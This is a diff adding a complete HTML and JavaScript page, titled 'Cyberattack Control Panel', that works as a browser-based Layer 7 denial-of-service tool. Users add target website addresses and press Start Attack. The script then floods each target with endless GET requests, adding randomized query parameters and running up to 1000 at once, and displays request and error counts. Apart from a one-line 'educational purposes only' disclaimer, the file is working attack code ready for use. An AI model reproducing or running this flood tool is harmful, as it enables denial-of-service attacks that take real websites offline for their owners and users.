@@ -1,0 +1,169 @@
+<!-- This  is for educational purposes only!! Copyright Disclaimer under section 107 of the Copyright Act 1976, allowance is made for “fair use” for purposes such as criticism, comment, news reporting, teaching, scholarship, education and research. -->
+
+<!doctype html>
+<html lang="en">
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+
+    <title>Cyberattack Control Panel</title>
+</head>
+
+<body>
+
+    <div class="container py-4">
+        <header class="pb-3 mb-4 border-bottom">
+            <p class="d-flex align-items-center text-dark text-decoration-none">
+                <span class="fs-4">Cyberattack Control Panel</span>
+            </p>
+        </header>
+
+        <div class="p-5 mb-4 bg-light rounded-3">
+            <div class="container-fluid py-5">
+                <h1 class="display-5 fw-bold">Layer 7 Attack</h1>
+                <p class="col fs-4">
+                    The script points to “target-website.com” with randomized query parameters.
+                    The messages sent by the browser are valid HTTP requests, making this a Layer 7 attack.
+                    Layer 7 attacks cause the web server and backend to do work, overloading the website’s resources and
+                    causing it to be unresponsive.
+                </p>
+                <form>
+                    <div class="row mb-3">
+                        <div class="col">
+                            <div class="form-floating">
+                                <input type="text" class="form-control" id="websiteAddressInput"
+                                    placeholder="target-website.com">
+                                <label for="floatingInput">Website address</label>
+                                <div class="invalid-feedback">
+                                    Please add a target website address.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="col">
+                            <div class="d-grid">
+                                <button type="button" class="btn btn-primary btn-lg" onclick="addTarget()">Add
+                                    Target</button>
+                            </div>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <div class="row mb-3 text-center">
+            <div class="col">
+                <div class="btn-group" role="group">
+                    <button type="button" class="btn btn-success" onclick="startAttack()">Start Attack</button>
+                    <button type="button" class="btn btn-danger" onclick="stopAttack()">Stop Attack</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="row p-5" id="stats"></div>
+        <div class="row p-5" id="errors"></div>
+
+        <footer class="pt-3 mt-4 text-muted border-top">
+            Cyberattack Control Panel © 2022
+        </footer>
+    </div>
+
+
+    <!-- JQuery -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+    <!-- Bootstrap Bundle with Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
+        crossorigin="anonymous"></script>
+</body>
+
+<script>
+
+    var targets = {}
+
+    var stop = false;
+
+    function startAttack() {
+        stop = false;
+        Object.keys(targets).map(flood)
+    }
+
+    function stopAttack() {
+        stop = true;
+    }
+
+    function addTarget() {
+        var input = document.getElementById("websiteAddressInput");
+        if (!input.value || input.value.length < 3) {
+            input.classList.add('is-invalid')
+        } else {
+            targets[input.value] = { number_of_requests: 0, number_of_errored_responses: 0 }
+            input.value = "";
+        }
+    }
+
+    var statsEl = document.getElementById('stats');
+    function printStats() {
+        statsEl.innerHTML = '<table class="table table-striped"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+    }
+    setInterval(printStats, 1000);
+
+    var CONCURRENCY_LIMIT = 1000
+    var queue = []
+
+    async function fetchWithTimeout(resource, options) {
+        const controller = new AbortController();
+        const id = setTimeout(() => controller.abort(), options.timeout);
+        return fetch(resource, {
+            method: 'GET',
+            mode: 'no-cors',
+            signal: controller.signal
+        }).then((response) => {
+            clearTimeout(id);
+            return response;
+        }).catch((error) => {
+            clearTimeout(id);
+            throw error;
+        });
+    }
+
+    async function flood(target) {
+        for (var i = 0; ; ++i) {
+            if (stop) {
+                break
+            }
+            if (queue.length > CONCURRENCY_LIMIT) {
+                await queue.shift()
+            }
+
+            rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
+            queue.push(
+                fetchWithTimeout(target + rand, { timeout: 1000 })
+                    .catch((error) => {
+                        if (error.code === 20 /* ABORT */) {
+                            return;
+                        }
+                        targets[target].number_of_errored_responses++;
+                    })
+                    .then((response) => {
+                        if (response && !response.ok) {
+                            targets[target].number_of_errored_responses++;
+                        }
+                        targets[target].number_of_requests++;
+                    })
+
+            )
+        }
+    }
+
+</script>
+
+</html>
